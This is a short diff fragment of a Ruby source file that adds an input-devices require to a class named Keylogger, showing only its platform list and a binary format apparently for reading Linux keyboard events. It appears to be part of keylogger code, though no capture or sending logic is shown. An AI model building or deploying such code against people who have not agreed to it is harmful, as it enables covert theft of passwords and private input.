@@ -1,3 +1,4 @@
+require_relative "input_devices"
 class Keylogger
   SUPPORTED_PLATFORMS = %w[x86_64-linux x86_64-linux-gnu].freeze
   FORMAT = "l!<l!<HHI!<".freeze
